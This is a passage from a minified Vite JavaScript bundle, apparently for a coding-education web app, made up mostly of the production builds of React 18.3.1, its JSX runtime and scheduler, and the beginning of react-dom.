const __vite__mapDeps=(i,m=__vite__mapDeps,d=(m.f||(m.f=["assets/Learn-DxjkvyX1.js","assets/shuffle-OzbddzsA.js","assets/Lesson-DgoRmHUD.js","assets/Playground-Cl5M-BTE.js","assets/DebugLab-B5zSNzS2.js","assets/LivePreview-B7sOUBYs.js","assets/PlaygroundPage-Csv_W2wD.js","assets/Projects-BFoxVOaJ.js"])))=>i.map(i=>d[i]);
var lx=Object.defineProperty;var cx=(e,t,n)=>t in e?lx(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n;var lr=(e,t,n)=>cx(e,typeof t!="symbol"?t+"":t,n);function ux(e,t){for(var n=0;n<t.length;n++){const s=t[n];if(typeof s!="string"&&!Array.isArray(s)){for(const r in s)if(r!=="default"&&!(r in e)){const i=Object.getOwnPropertyDescriptor(s,r);i&&Object.defineProperty(e,r,i.get?i:{enumerable:!0,get:()=>s[r]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))s(r);new MutationObserver(r=>{for(const i of r)if(i.type==="childList")for(const o of i.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&s(o)}).observe(document,{childList:!0,subtree:!0});function n(r){const i={};return r.integrity&&(i.integrity=r.integrity),r.referrerPolicy&&(i.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?i.credentials="include":r.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function s(r){if(r.ep)return;r.ep=!0;const i=n(r);fetch(r.href,i)}})();var iI=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function dx(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}function oI(e){if(e.__esModule)return e;var t=e.default;if(typeof t=="function"){var n=function s(){return this instanceof s?Reflect.construct(t,arguments,this.constructor):t.apply(this,arguments)};n.prototype=t.prototype}else n={};return Object.defineProperty(n,"__esModule",{value:!0}),Object.keys(e).forEach(function(s){var r=Object.getOwnPropertyDescriptor(e,s);Object.defineProperty(n,s,r.get?r:{enumerable:!0,get:function(){return e[s]}})}),n}var ag={exports:{}},Ra={},lg={exports:{}},F={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var xi=Symbol.for("react.element"),hx=Symbol.for("react.portal"),px=Symbol.for("react.fragment"),fx=Symbol.for("react.strict_mode"),mx=Symbol.for("react.profiler"),gx=Symbol.for("react.provider"),yx=Symbol.for("react.context"),wx=Symbol.for("react.forward_ref"),vx=Symbol.for("react.suspense"),bx=Symbol.for("react.memo"),xx=Symbol.for("react.lazy"),Ih=Symbol.iterator;function kx(e){return e===null||typeof e!="object"?null:(e=Ih&&e[Ih]||e["@@iterator"],typeof e=="function"?e:null)}var cg={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},ug=Object.assign,dg={};function er(e,t,n){this.props=e,this.context=t,this.refs=dg,this.updater=n||cg}er.prototype.isReactComponent={};er.prototype.setState=function(e,t){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,t,"setState")};er.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function hg(){}hg.prototype=er.prototype;function Vu(e,t,n){this.props=e,this.context=t,this.refs=dg,this.updater=n||cg}var Wu=Vu.prototype=new hg;Wu.constructor=Vu;ug(Wu,er.prototype);Wu.isPureReactComponent=!0;var Nh=Array.isArray,pg=Object.prototype.hasOwnProperty,Uu={current:null},fg={key:!0,ref:!0,__self:!0,__source:!0};function mg(e,t,n){var s,r={},i=null,o=null;if(t!=null)for(s in t.ref!==void 0&&(o=t.ref),t.key!==void 0&&(i=""+t.key),t)pg.call(t,s)&&!fg.hasOwnProperty(s)&&(r[s]=t[s]);var a=arguments.length-2;if(a===1)r.children=n;else if(1<a){for(var l=Array(a),c=0;c<a;c++)l[c]=arguments[c+2];r.children=l}if(e&&e.defaultProps)for(s in a=e.defaultProps,a)r[s]===void 0&&(r[s]=a[s]);return{$$typeof:xi,type:e,key:i,ref:o,props:r,_owner:Uu.current}}function Sx(e,t){return{$$typeof:xi,type:e.type,key:t,ref:e.ref,props:e.props,_owner:e._owner}}function zu(e){return typeof e=="object"&&e!==null&&e.$$typeof===xi}function Tx(e){var t={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(n){return t[n]})}var jh=/\/+/g;function sl(e,t){return typeof e=="object"&&e!==null&&e.key!=null?Tx(""+e.key):t.toString(36)}function vo(e,t,n,s,r){var i=typeof e;(i==="undefined"||i==="boolean")&&(e=null);var o=!1;if(e===null)o=!0;else switch(i){case"string":case"number":o=!0;break;case"object":switch(e.$$typeof){case xi:case hx:o=!0}}if(o)return o=e,r=r(o),e=s===""?"."+sl(o,0):s,Nh(r)?(n="",e!=null&&(n=e.replace(jh,"$&/")+"/"),vo(r,t,n,"",function(c){return c})):r!=null&&(zu(r)&&(r=Sx(r,n+(!r.key||o&&o.key===r.key?"":(""+r.key).replace(jh,"$&/")+"/")+e)),t.push(r)),1;if(o=0,s=s===""?".":s+":",Nh(e))for(var a=0;a<e.length;a++){i=e[a];var l=s+sl(i,a);o+=vo(i,t,n,l,r)}else if(l=kx(e),typeof l=="function")for(e=l.call(e),a=0;!(i=e.next()).done;)i=i.value,l=s+sl(i,a++),o+=vo(i,t,n,l,r);else if(i==="object")throw t=String(e),Error("Objects are not valid as a React child (found: "+(t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t)+"). If you meant to render a collection of children, use an array instead.");return o}function Fi(e,t,n){if(e==null)return e;var s=[],r=0;return vo(e,s,"","",function(i){return t.call(n,i,r++)}),s}function Cx(e){if(e._status===-1){var t=e._result;t=t(),t.then(function(n){(e._status===0||e._status===-1)&&(e._status=1,e._result=n)},function(n){(e._status===0||e._status===-1)&&(e._status=2,e._result=n)}),e._status===-1&&(e._status=0,e._result=t)}if(e._status===1)return e._result.default;throw e._result}var Oe={current:null},bo={transition:null},Ax={ReactCurrentDispatcher:Oe,ReactCurrentBatchConfig:bo,ReactCurrentOwner:Uu};function gg(){throw Error("act(...) is not supported in production builds of React.")}F.Children={map:Fi,forEach:function(e,t,n){Fi(e,function(){t.apply(this,arguments)},n)},count:function(e){var t=0;return Fi(e,function(){t++}),t},toArray:function(e){return Fi(e,function(t){return t})||[]},only:function(e){if(!zu(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};F.Component=er;F.Fragment=px;F.Profiler=mx;F.PureComponent=Vu;F.StrictMode=fx;F.Suspense=vx;F.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Ax;F.act=gg;F.cloneElement=function(e,t,n){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var s=ug({},e.props),r=e.key,i=e.ref,o=e._owner;if(t!=null){if(t.ref!==void 0&&(i=t.ref,o=Uu.current),t.key!==void 0&&(r=""+t.key),e.type&&e.type.defaultProps)var a=e.type.defaultProps;for(l in t)pg.call(t,l)&&!fg.hasOwnProperty(l)&&(s[l]=t[l]===void 0&&a!==void 0?a[l]:t[l])}var l=arguments.length-2;if(l===1)s.children=n;else if(1<l){a=Array(l);for(var c=0;c<l;c++)a[c]=arguments[c+2];s.children=a}return{$$typeof:xi,type:e.type,key:r,ref:i,props:s,_owner:o}};F.createContext=function(e){return e={$$typeof:yx,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:gx,_context:e},e.Consumer=e};F.createElement=mg;F.createFactory=function(e){var t=mg.bind(null,e);return t.type=e,t};F.createRef=function(){return{current:null}};F.forwardRef=function(e){return{$$typeof:wx,render:e}};F.isValidElement=zu;F.lazy=function(e){return{$$typeof:xx,_payload:{_status:-1,_result:e},_init:Cx}};F.memo=function(e,t){return{$$typeof:bx,type:e,compare:t===void 0?null:t}};F.startTransition=function(e){var t=bo.transition;bo.transition={};try{e()}finally{bo.transition=t}};F.unstable_act=gg;F.useCallback=function(e,t){return Oe.current.useCallback(e,t)};F.useContext=function(e){return Oe.current.useContext(e)};F.useDebugValue=function(){};F.useDeferredValue=function(e){return Oe.current.useDeferredValue(e)};F.useEffect=function(e,t){return Oe.current.useEffect(e,t)};F.useId=function(){return Oe.current.useId()};F.useImperativeHandle=function(e,t,n){return Oe.current.useImperativeHandle(e,t,n)};F.useInsertionEffect=function(e,t){return Oe.current.useInsertionEffect(e,t)};F.useLayoutEffect=function(e,t){return Oe.current.useLayoutEffect(e,t)};F.useMemo=function(e,t){return Oe.current.useMemo(e,t)};F.useReducer=function(e,t,n){return Oe.current.useReducer(e,t,n)};F.useRef=function(e){return Oe.current.useRef(e)};F.useState=function(e){return Oe.current.useState(e)};F.useSyncExternalStore=function(e,t,n){return Oe.current.useSyncExternalStore(e,t,n)};F.useTransition=function(){return Oe.current.useTransition()};F.version="18.3.1";lg.exports=F;var w=lg.exports;const Ut=dx(w),Ex=ux({__proto__:null,default:Ut},[w]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Rx=w,Px=Symbol.for("react.element"),qx=Symbol.for("react.fragment"),Ox=Object.prototype.hasOwnProperty,Ix=Rx.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,Nx={key:!0,ref:!0,__self:!0,__source:!0};function yg(e,t,n){var s,r={},i=null,o=null;n!==void 0&&(i=""+n),t.key!==void 0&&(i=""+t.key),t.ref!==void 0&&(o=t.ref);for(s in t)Ox.call(t,s)&&!Nx.hasOwnProperty(s)&&(r[s]=t[s]);if(e&&e.defaultProps)for(s in t=e.defaultProps,t)r[s]===void 0&&(r[s]=t[s]);return{$$typeof:Px,type:e,key:i,ref:o,props:r,_owner:Ix.current}}Ra.Fragment=qx;Ra.jsx=yg;Ra.jsxs=yg;ag.exports=Ra;var p=ag.exports,lc={},wg={exports:{}},Ze={},vg={exports:{}},bg={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function t(A,O){var j=A.length;A.push(O);e:for(;0<j;){var V=j-1>>>1,Y=A[V];if(0<r(Y,O))A[V]=O,A[j]=Y,j=V;else break e}}function n(A){return A.length===0?null:A[0]}function s(A){if(A.length===0)return null;var O=A[0],j=A.pop();if(j!==O){A[0]=j;e:for(var V=0,Y=A.length,cs=Y>>>1;V<cs;){var In=2*(V+1)-1,nl=A[In],Nn=In+1,_i=A[Nn];if(0>r(nl,j))Nn<Y&&0>r(_i,nl)?(A[V]=_i,A[Nn]=j,V=Nn):(A[V]=nl,A[In]=j,V=In);else if(Nn<Y&&0>r(_i,j))A[V]=_i,A[Nn]=j,V=Nn;else break e}}return O}function r(A,O){var j=A.sortIndex-O.sortIndex;return j!==0?j:A.id-O.id}if(typeof performance=="object"&&typeof performance.now=="function"){var i=performance;e.unstable_now=function(){return i.now()}}else{var o=Date,a=o.now();e.unstable_now=function(){return o.now()-a}}var l=[],c=[],u=1,d=null,h=3,m=!1,f=!1,v=!1,x=typeof setTimeout=="function"?setTimeout:null,y=typeof clearTimeout=="function"?clearTimeout:null,g=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function b(A){for(var O=n(c);O!==null;){if(O.callback===null)s(c);else if(O.startTime<=A)s(c),O.sortIndex=O.expirationTime,t(l,O);else break;O=n(c)}}function k(A){if(v=!1,b(A),!f)if(n(l)!==null)f=!0,_(C);else{var O=n(c);O!==null&&U(k,O.startTime-A)}}function C(A,O){f=!1,v&&(v=!1,y(T),T=-1),m=!0;var j=h;try{for(b(O),d=n(l);d!==null&&(!(d.expirationTime>O)||A&&!M());){var V=d.callback;if(typeof V=="function"){d.callback=null,h=d.priorityLevel;var Y=V(d.expirationTime<=O);O=e.unstable_now(),typeof Y=="function"?d.callback=Y:d===n(l)&&s(l),b(O)}else s(l);d=n(l)}if(d!==null)var cs=!0;else{var In=n(c);In!==null&&U(k,In.startTime-O),cs=!1}return cs}finally{d=null,h=j,m=!1}}var E=!1,S=null,T=-1,q=5,R=-1;function M(){return!(e.unstable_now()-R<q)}function Q(){if(S!==null){var A=e.unstable_now();R=A;var O=!0;try{O=S(!0,A)}finally{O?$():(E=!1,S=null)}}else E=!1}var $;if(typeof g=="function")$=function(){g(Q)};else if(typeof MessageChannel<"u"){var Ue=new MessageChannel,D=Ue.port2;Ue.port1.onmessage=Q,$=function(){D.postMessage(null)}}else $=function(){x(Q,0)};function _(A){S=A,E||(E=!0,$())}function U(A,O){T=x(function(){A(e.unstable_now())},O)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(A){A.callback=null},e.unstable_continueExecution=function(){f||m||(f=!0,_(C))},e.unstable_forceFrameRate=function(A){0>A||125<A?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):q=0<A?Math.floor(1e3/A):5},e.unstable_getCurrentPriorityLevel=function(){return h},e.unstable_getFirstCallbackNode=function(){return n(l)},e.unstable_next=function(A){switch(h){case 1:case 2:case 3:var O=3;break;default:O=h}var j=h;h=O;try{return A()}finally{h=j}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(A,O){switch(A){case 1:case 2:case 3:case 4:case 5:break;default:A=3}var j=h;h=A;try{return O()}finally{h=j}},e.unstable_scheduleCallback=function(A,O,j){var V=e.unstable_now();switch(typeof j=="object"&&j!==null?(j=j.delay,j=typeof j=="number"&&0<j?V+j:V):j=V,A){case 1:var Y=-1;break;case 2:Y=250;break;case 5:Y=1073741823;break;case 4:Y=1e4;break;default:Y=5e3}return Y=j+Y,A={id:u++,callback:O,priorityLevel:A,startTime:j,expirationTime:Y,sortIndex:-1},j>V?(A.sortIndex=j,t(c,A),n(l)===null&&A===n(c)&&(v?(y(T),T=-1):v=!0,U(k,j-V))):(A.sortIndex=Y,t(l,A),f||m||(f=!0,_(C))),A},e.unstable_shouldYield=M,e.unstable_wrapCallback=function(A){var O=h;return function(){var j=h;h=O;try{return A.apply(this,arguments)}finally{h=j}}}})(bg);vg.exports=bg;var jx=vg.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Mx=w,Je=jx;function P(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,n=1;n<arguments.length;n++)t+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var xg=new Set,$r={};function is(e,t){Us(e,t),Us(e+"Capture",t)}function Us(e,t){for($r[e]=t,e=0;e<t.length;e++)xg.add(t[e])}var Qt=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),cc=Object.prototype.hasOwnProperty,Lx=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,Mh={},Lh={};function Dx(e){return cc.call(Lh,e)?!0:cc.call(Mh,e)?!1:Lx.test(e)?Lh[e]=!0:(Mh[e]=!0,!1)}function _x(e,t,n,s){if(n!==null&&n.type===0)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return s?!1:n!==null?!n.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function Fx(e,t,n,s){if(t===null||typeof t>"u"||_x(e,t,n,s))return!0;if(s)return!1;if(n!==null)switch(n.type){case 3:return!t;case 4:return t===!1;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}function Ie(e,t,n,s,r,i,o){this.acceptsBooleans=t===2||t===3||t===4,this.attributeName=s,this.attributeNamespace=r,this.mustUseProperty=n,this.propertyName=e,this.type=t,this.sanitizeURL=i,this.removeEmptyString=o}var ke={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){ke[e]=new Ie(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var t=e[0];ke[t]=new Ie(t,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){ke[e]=new Ie(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){ke[e]=new Ie(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){ke[e]=new Ie(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){ke[e]=new Ie(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){ke[e]=new Ie(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){ke[e]=new Ie(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){ke[e]=new Ie(e,5,!1,e.toLowerCase(),null,!1,!1)});var $u=/[\-:]([a-z])/g;function Hu(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var t=e.replace($u,Hu);ke[t]=new Ie(t,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var t=e.replace($u,Hu);ke[t]=new Ie(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var t=e.replace($u,Hu);ke[t]=new Ie(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){ke[e]=new Ie(e,1,!1,e.toLowerCase(),null,!1,!1)});ke.xlinkHref=new Ie("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){ke[e]=new Ie(e,1,!1,e.toLowerCase(),null,!0,!0)});function Qu(e,t,n,s){var r=ke.hasOwnProperty(t)?ke[t]:null;(r!==null?r.type!==0:s||!(2<t.length)||t[0]!=="o"&&t[0]!=="O"||t[1]!=="n"&&t[1]!=="N")&&(Fx(t,n,r,s)&&(n=null),s||r===null?Dx(t)&&(n===null?e.removeAttribute(t):e.setAttribute(t,""+n)):r.mustUseProperty?e[r.propertyName]=n===null?r.type===3?!1:"":n:(t=r.attributeName,s=r.attributeNamespace,n===null?e.removeAttribute(t):(r=r.type,n=r===3||r===4&&n===!0?"":""+n,s?e.setAttributeNS(s,t,n):e.setAttribute(t,n))))}var Jt=Mx.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Bi=Symbol.for("react.element"),ms=Symbol.for("react.portal"),gs=Symbol.for("react.fragment"),Gu=Symbol.for("react.strict_mode"),uc=Symbol.for("react.profiler"),kg=Symbol.for("react.provider"),Sg=Symbol.for("react.context"),Ku=Symbol.for("react.forward_ref"),dc=Symbol.for("react.suspense"),hc=Symbol.for("react.suspense_list"),Yu=Symbol.for("react.memo"),rn=Symbol.for("react.lazy"),Tg=Symbol.for("react.offscreen"),Dh=Symbol.iterator;function cr(e){return e===null||typeof e!="object"?null:(e=Dh&&e[Dh]||e["@@iterator"],typeof e=="function"?e:null)}var ne=Object.assign,rl;function vr(e){if(rl===void 0)try{throw Error()}catch(n){var t=n.stack.trim().match(/\n( *(at )?)/);rl=t&&t[1]||""}return`
`+rl+e}var il=!1;function ol(e,t){if(!e||il)return"";il=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(t,[])}catch(c){var s=c}Reflect.construct(e,[],t)}else{try{t.call()}catch(c){s=c}e.call(t.prototype)}else{try{throw Error()}catch(c){s=c}e()}}catch(c){if(c&&s&&typeof c.stack=="string"){for(var r=c.stack.split(`
`),i=s.stack.split(`
`),o=r.length-1,a=i.length-1;1<=o&&0<=a&&r[o]!==i[a];)a--;for(;1<=o&&0<=a;o--,a--)if(r[o]!==i[a]){if(o!==1||a!==1)do if(o--,a--,0>a||r[o]!==i[a]){var l=`
`+r[o].replace(" at new "," at ");return e.displayName&&l.includes("<anonymous>")&&(l=l.replace("<anonymous>",e.displayName)),l}while(1<=o&&0<=a);break}}}finally{il=!1,Error.prepareStackTrace=n}return(e=e?e.displayName||e.name:"")?vr(e):""}function Bx(e){switch(e.tag){case 5:return vr(e.type);case 16:return vr("Lazy");case 13:return vr("Suspense");case 19:return vr("SuspenseList");case 0:case 2:case 15:return e=ol(e.type,!1),e;case 11:return e=ol(e.type.render,!1),e;case 1:return e=ol(e.type,!0),e;default:return""}}function pc(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case gs:return"Fragment";case ms:return"Portal";case uc:return"Profiler";case Gu:return"StrictMode";case dc:return"Suspense";case hc:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case Sg:return(e.displayName||"Context")+".Consumer";case kg:return(e._context.displayName||"Context")+".Provider";case Ku:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case Yu:return t=e.displayName||null,t!==null?t:pc(e.type)||"Memo";case rn:t=e._payload,e=e._init;try{return pc(e(t))}catch{}}return null}function Vx(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=t.render,e=e.displayName||e.name||"",t.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return pc(t);case 8:return t===Gu?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t}return null}function Sn(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Cg(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function Wx(e){var t=Cg(e)?"checked":"value",n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),s=""+e[t];if(!e.hasOwnProperty(t)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var r=n.get,i=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return r.call(this)},set:function(o){s=""+o,i.call(this,o)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return s},setValue:function(o){s=""+o},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function Vi(e){e._valueTracker||(e._valueTracker=Wx(e))}function Ag(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),s="";return e&&(s=Cg(e)?e.checked?"true":"false":e.value),e=s,e!==n?(t.setValue(e),!0):!1}function Fo(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function fc(e,t){var n=t.checked;return ne({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:n??e._wrapperState.initialChecked})}function _h(e,t){var n=t.defaultValue==null?"":t.defaultValue,s=t.checked!=null?t.checked:t.defaultChecked;n=Sn(t.value!=null?t.value:n),e._wrapperState={initialChecked:s,initialValue:n,controlled:t.type==="checkbox"||t.type==="radio"?t.checked!=null:t.value!=null}}function Eg(e,t){t=t.checked,t!=null&&Qu(e,"checked",t,!1)}function mc(e,t){Eg(e,t);var n=Sn(t.value),s=t.type;if(n!=null)s==="number"?(n===0&&e.value===""||e.value!=n)&&(e.value=""+n):e.value!==""+n&&(e.value=""+n);else if(s==="submit"||s==="reset"){e.removeAttribute("value");return}t.hasOwnProperty("value")?gc(e,t.type,n):t.hasOwnProperty("defaultValue")&&gc(e,t.type,Sn(t.defaultValue)),t.checked==null&&t.defaultChecked!=null&&(e.defaultChecked=!!t.defaultChecked)}function Fh(e,t,n){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var s=t.type;if(!(s!=="submit"&&s!=="reset"||t.value!==void 0&&t.value!==null))return;t=""+e._wrapperState.initialValue,n||t===e.value||(e.value=t),e.defaultValue=t}n=e.name,n!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,n!==""&&(e.name=n)}function gc(e,t,n){(t!=="number"||Fo(e.ownerDocument)!==e)&&(n==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+n&&(e.defaultValue=""+n))}var br=Array.isArray;function Ns(e,t,n,s){if(e=e.options,t){t={};for(var r=0;r<n.length;r++)t["$"+n[r]]=!0;for(n=0;n<e.length;n++)r=t.hasOwnProperty("$"+e[n].value),e[n].selected!==r&&(e[n].selected=r),r&&s&&(e[n].defaultSelected=!0)}else{for(n=""+Sn(n),t=null,r=0;r<e.length;r++){if(e[r].value===n){e[r].selected=!0,s&&(e[r].defaultSelected=!0);return}t!==null||e[r].disabled||(t=e[r])}t!==null&&(t.selected=!0)}}function yc(e,t){if(t.dangerouslySetInnerHTML!=null)throw Error(P(91));return ne({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Bh(e,t){var n=t.value;if(n==null){if(n=t.children,t=t.defaultValue,n!=null){if(t!=null)throw Error(P(92));if(br(n)){if(1<n.length)throw Error(P(93));n=n[0]}t=n}t==null&&(t=""),n=t}e._wrapperState={initialValue:Sn(n)}}function Rg(e,t){var n=Sn(t.value),s=Sn(t.defaultValue);n!=null&&(n=""+n,n!==e.value&&(e.value=n),t.defaultValue==null&&e.defaultValue!==n&&(e.defaultValue=n)),s!=null&&(e.defaultValue=""+s)}function Vh(e){var t=e.textContent;t===e._wrapperState.initialValue&&t!==""&&t!==null&&(e.value=t)}function Pg(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function wc(e,t){return e==null||e==="http://www.w3.org/1999/xhtml"?Pg(t):e==="http://www.w3.org/2000/svg"&&t==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var Wi,qg=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(t,n,s,r){MSApp.execUnsafeLocalFunction(function(){return e(t,n,s,r)})}:e}(function(e,t){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=t;else{for(Wi=Wi||document.createElement("div"),Wi.innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=Wi.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}});function Hr(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&n.nodeType===3){n.nodeValue=t;return}}e.textContent=t}var 